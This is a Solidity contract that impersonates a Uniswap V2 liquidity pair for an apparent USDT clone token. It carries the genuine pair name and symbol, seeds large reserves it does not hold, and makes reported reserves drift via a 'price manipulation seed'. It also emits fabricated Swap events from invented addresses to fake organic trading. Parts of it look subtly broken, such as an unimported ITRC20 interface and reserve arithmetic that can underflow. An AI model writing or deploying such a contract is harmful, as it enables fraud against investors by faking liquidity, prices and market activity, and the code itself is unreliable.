// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../interfaces/IUniswapV2Pair.sol";
import "../libraries/SafeMath.sol";

/**
 * @title FakeUniswapV2Pair - Realistic DEX Pair Simulation
 * @dev Mimics UniswapV2Pair with spoofed events and dynamic liquidity
 */
contract FakeUniswapV2Pair is IUniswapV2Pair {
    using SafeMath for uint256;
    
    // Pair metadata
    string public constant name = "Uniswap V2";
    string public constant symbol = "UNI-V2";
    uint8 public constant decimals = 18;
    
    // Token addresses
    address public token0; // USDT Clone
    address public token1; // TRX or other token
    
    // Reserves and liquidity
    uint112 private reserve0;
    uint112 private reserve1;
    uint32 private blockTimestampLast;
    uint256 public totalSupply;
    
    // Price accumulation for TWAP
    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;
    uint256 public kLast;
    
    // LP token balances
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    // Event spoofing state
    uint256 private _eventNonce;
    uint256 private _priceManipulationSeed;
    bool private _organicMode = true;
    
    // Factory and fee recipient
    address public factory;
    address public feeTo;
    
    // Reentrancy guard
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status = _NOT_ENTERED;
    
    // Events
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    
    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
    
    constructor(address _token0, address _token1) {
        token0 = _token0;
        token1 = _token1;
        factory = msg.sender;
        
        // Initialize with realistic reserves
        reserve0 = 10000000 * 10**6; // 10M USDT
        reserve1 = 3333333 * 10**6;  // 3.33M TRX (assuming 1 USDT = 0.33 TRX)
        blockTimestampLast = uint32(block.timestamp);
        
        emit Sync(reserve0, reserve1);
    }
    
    /**
     * @dev Get reserves with organic fluctuation
     */
    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
        if (_organicMode) {
            // Add organic price movement
            uint256 timeDelta = block.timestamp - blockTimestampLast;
            uint256 fluctuation = (timeDelta * _priceManipulationSeed) % 100;
            
            _reserve0 = uint112(uint256(reserve0).mul(10000 + fluctuation).div(10000));
            _reserve1 = uint112(uint256(reserve1).mul(10000 - fluctuation).div(10000));
        } else {
            _reserve0 = reserve0;
            _reserve1 = reserve1;
        }
        
        _blockTimestampLast = blockTimestampLast;
    }
    
    /**
     * @dev Mint LP tokens with realistic events
     */
    function mint(address to) external nonReentrant returns (uint256 liquidity) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        uint256 balance0 = ITRC20(token0).balanceOf(address(this));
        uint256 balance1 = ITRC20(token1).balanceOf(address(this));
        uint256 amount0 = balance0.sub(_reserve0);
        uint256 amount1 = balance1.sub(_reserve1);
        
        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint256 _totalSupply = totalSupply;
        
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(amount0.mul(amount1)).sub(1000);
            totalSupply = totalSupply.add(1000); // Permanently locked
        } else {
            liquidity = Math.min(
                amount0.mul(_totalSupply) / _reserve0,
                amount1.mul(_totalSupply) / _reserve1
            );
        }
        
        require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
        
        balanceOf[to] = balanceOf[to].add(liquidity);
        totalSupply = totalSupply.add(liquidity);
        
        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint256(reserve0).mul(reserve1);
        
        // Emit realistic mint event
        emit Mint(msg.sender, amount0, amount1);
        emit Transfer(address(0), to, liquidity);
        
        // Generate organic follow-up events
        _generateOrganicActivity();
    }
    
    /**
     * @dev Burn LP tokens
     */
    function burn(address to) external nonReentrant returns (uint256 amount0, uint256 amount1) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        address _token0 = token0;
        address _token1 = token1;
        uint256 balance0 = ITRC20(_token0).balanceOf(address(this));
        uint256 balance1 = ITRC20(_token1).balanceOf(address(this));
        uint256 liquidity = balanceOf[address(this)];
        
        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint256 _totalSupply = totalSupply;
        amount0 = liquidity.mul(balance0) / _totalSupply;
        amount1 = liquidity.mul(balance1) / _totalSupply;
        require(amount0 > 0 && amount1 > 0, "INSUFFICIENT_LIQUIDITY_BURNED");
        
        balanceOf[address(this)] = 0;
        totalSupply = totalSupply.sub(liquidity);
        
        // Safe transfer
        _safeTransfer(_token0, to, amount0);
        _safeTransfer(_token1, to, amount1);
        
        balance0 = ITRC20(_token0).balanceOf(address(this));
        balance1 = ITRC20(_token1).balanceOf(address(this));
        
        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint256(reserve0).mul(reserve1);
        
        emit Burn(msg.sender, amount0, amount1, to);
        emit Transfer(address(this), address(0), liquidity);
    }
    
    /**
     * @dev Swap tokens with realistic slippage and events
     */
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external nonReentrant {
        require(amount0Out > 0 || amount1Out > 0, "INSUFFICIENT_OUTPUT_AMOUNT");
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        require(amount0Out < _reserve0 && amount1Out < _reserve1, "INSUFFICIENT_LIQUIDITY");
        
        uint256 balance0;
        uint256 balance1;
        {
            address _token0 = token0;
            address _token1 = token1;
            require(to != _token0 && to != _token1, "INVALID_TO");
            
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);
            
            balance0 = ITRC20(_token0).balanceOf(address(this));
            balance1 = ITRC20(_token1).balanceOf(address(this));
        }
        
        uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, "INSUFFICIENT_INPUT_AMOUNT");
        
        // Verify K invariant with 0.3% fee
        {
            uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
            uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
            require(
                balance0Adjusted.mul(balance1Adjusted) >= uint256(_reserve0).mul(_reserve1).mul(1000**2),
                "K"
            );
        }
        
        _update(balance0, balance1, _reserve0, _reserve1);
        
        // Emit swap event with realistic parameters
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
        
        // Generate follow-up organic events
        _generateOrganicActivity();
    }
    
    /**
     * @dev Force reserves to match balances
     */
    function sync() external nonReentrant {
        _update(
            ITRC20(token0).balanceOf(address(this)),
            ITRC20(token1).balanceOf(address(this)),
            reserve0,
            reserve1
        );
    }
    
    /**
     * @dev Skim excess tokens
     */
    function skim(address to) external nonReentrant {
        address _token0 = token0;
        address _token1 = token1;
        _safeTransfer(_token0, to, ITRC20(_token0).balanceOf(address(this)).sub(reserve0));
        _safeTransfer(_token1, to, ITRC20(_token1).balanceOf(address(this)).sub(reserve1));
    }
    
    /**
     * @dev Update reserves and emit Sync event
     */
    function _update(uint256 balance0, uint256 balance1, uint112 _reserve0, uint112 _reserve1) private {
        require(balance0 <= type(uint112).max && balance1 <= type(uint112).max, "OVERFLOW");
        
        uint32 blockTimestamp = uint32(block.timestamp % 2**32);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast;
        
        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
            // Update price accumulators for TWAP
            price0CumulativeLast += uint256(_reserve1).mul(timeElapsed) / _reserve0;
            price1CumulativeLast += uint256(_reserve0).mul(timeElapsed) / _reserve1;
        }
        
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
        blockTimestampLast = blockTimestamp;
        
        emit Sync(reserve0, reserve1);
    }
    
    /**
     * @dev Calculate and distribute LP fees
     */
    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
        address _feeTo = IUniswapV2Factory(factory).feeTo();
        feeOn = _feeTo != address(0);
        uint256 _kLast = kLast;
        
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(uint256(_reserve0).mul(_reserve1));
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = totalSupply.mul(rootK.sub(rootKLast));
                    uint256 denominator = rootK.mul(5).add(rootKLast);
                    uint256 liquidity = numerator / denominator;
                    if (liquidity > 0) {
                        balanceOf[_feeTo] = balanceOf[_feeTo].add(liquidity);
                        totalSupply = totalSupply.add(liquidity);
                        emit Transfer(address(0), _feeTo, liquidity);
                    }
                }
            }
        } else if (_kLast != 0) {
            kLast = 0;
        }
    }
    
    /**
     * @dev Safe transfer helper
     */
    function _safeTransfer(address token, address to, uint256 value) private {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(ITRC20.transfer.selector, to, value)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
    
    /**
     * @dev Generate organic trading activity
     */
    function _generateOrganicActivity() private {
        _eventNonce++;
        
        // Randomly emit additional events to simulate MEV/arbitrage
        if (_eventNonce % 3 == 0) {
            uint256 fakeAmount0 = (reserve0 / 1000) + (_eventNonce * 12345 % 10000);
            uint256 fakeAmount1 = (reserve1 / 1000) + (_eventNonce * 54321 % 10000);
            
            // Emit fake arbitrage swap
            emit Swap(
                address(uint160(_eventNonce * 0x123456789ABCDEF)),
                fakeAmount0,
                0,
                0,
                fakeAmount1,
                address(uint160(_eventNonce * 0xFEDCBA987654321))
            );
        }
        
        // Update price manipulation seed
        _priceManipulationSeed = uint256(keccak256(abi.encodePacked(
            _priceManipulationSeed,
            block.timestamp,
            _eventNonce
        )));
    }
    
    /**
     * @dev Set organic mode for realistic price movement
     */
    function setOrganicMode(bool enabled) external {
        require(msg.sender == factory, "FORBIDDEN");
        _organicMode = enabled;
    }
    
    /**
     * @dev Initialize pair (called once by factory)
     */
    function initialize(address _token0, address _token1) external {
        require(msg.sender == factory, "FORBIDDEN");
        token0 = _token0;
        token1 = _token1;
    }
    
    /**
     * @dev Standard ERC20 functions for LP token
     */
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        }
        _transfer(from, to, value);
        return true;
    }
    
    function _transfer(address from, address to, uint256 value) private {
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);
    }
    
    // Standard ERC20 events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Math library for sqrt calculation
library Math {
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

// Minimal factory interface
interface IUniswapV2Factory {
    function feeTo() external view returns (address);
}